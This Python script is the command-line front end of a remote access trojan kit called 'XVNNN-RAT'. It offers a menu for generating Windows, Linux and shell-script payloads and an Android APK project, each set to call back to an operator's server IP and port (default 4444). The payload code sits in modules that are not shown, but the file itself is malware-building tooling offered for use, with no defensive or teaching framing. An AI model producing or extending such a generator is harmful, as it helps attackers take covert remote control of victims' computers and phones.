#!/usr/bin/env python3
"""
XVNNN-RAT Payload Generation Tool
Author: Ali Zafar (alizafarbati@gmail.com)
Version: 1.0.0
"""

import sys
import os

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from generator import APKGenerator, PayloadGenerator

def main():
    print("=" * 60)
    print("XVNNN-RAT v1.0.0 - Payload Generator")
    print("=" * 60)
    print()
    
    print("Payload Types:")
    print("  1. Windows Python Payload")
    print("  2. Linux Python Payload")
    print("  3. Shell Script Payload")
    print("  4. Generate All Payloads")
    print("  5. Android APK Project")
    print("  6. Exit")
    print()
    
    choice = input("Select option: ").strip()
    
    server_ip = input("Server IP (default: 127.0.0.1): ").strip() or "127.0.0.1"
    server_port = input("Server Port (default: 4444): ").strip() or "4444"
    server_port = int(server_port)
    
    generator = PayloadGenerator()
    
    if choice == '1':
        payload = generator.generate_windows_payload(server_ip, server_port, "py")
        save_payload("windows_payload.py", payload)
    
    elif choice == '2':
        payload = generator.generate_linux_payload(server_ip, server_port, "py")
        save_payload("linux_payload.py", payload)
    
    elif choice == '3':
        payload = generator.generate_shell_script(server_ip, server_port)
        save_payload("shell_payload.sh", payload)
    
    elif choice == '4':
        result = generator.generate_all_payloads(server_ip, server_port)
        print(f"\n✓ Payloads generated in: {result['output_dir']}")
        print(f"  Files: {', '.join(result['payloads'])}")
    
    elif choice == '5':
        apk_gen = APKGenerator()
        result = apk_gen.generate_apk_project(server_ip, server_port)
        if result['status'] == 'success':
            print(f"\n✓ APK project created in: {result['project_dir']}")
            print(f"  Files: {', '.join(result['files_created'])}")
            print("\nNext steps:")
            for step in result['next_steps']:
                print(f"  {step}")
        else:
            print(f"\n✗ Error: {result['error']}")
    
    elif choice == '6':
        print("Exiting...")
        return
    
    else:
        print("Invalid choice")
    
    print("\nDone!")

def save_payload(filename, content):
    """Save payload to file"""
    with open(filename, 'w') as f:
        f.write(content)
    print(f"\n✓ Payload saved as: {filename}")
    print(f"  Size: {len(content)} bytes")

if __name__ == "__main__":
    main()